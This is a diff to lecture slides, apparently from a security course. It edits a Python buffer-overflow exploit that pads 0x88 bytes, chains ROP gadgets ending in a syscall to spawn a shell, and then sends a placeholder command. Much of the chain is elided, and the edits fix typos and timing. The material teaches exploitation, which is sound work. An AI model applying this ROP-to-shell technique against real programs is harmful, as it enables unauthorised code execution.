@@ -107,9 +107,8 @@ vulnerable:
 
 ::: {.column width=59%}
 
-```{.python code-line-numbers="|3-4|10-11|13-17"}
+```{.python code-line-numbers="|2-3|9-11|13-17"}
 ...
-
 # Padding goes here
 p = b'A' * 0x88 # <-- modified
 
@@ -117,14 +116,15 @@ p += pack('<Q', 0x0000000000409ece) # pop rsi ; ret
 ...
 p += pack('<Q', 0x0000000000401c14) # syscall
 
+from_program.read(1) # wait for "Input: "
 to_program.write(p + b'\n')
-to-program.flush()
+to_program.flush()
 
 # wait for shell to start
     # hopefully this is long enough
 time.sleep(1)
 to_program.write('my_malicious_command\n')
-to-program.flush()
+to_program.flush()
 ```
 
 :::
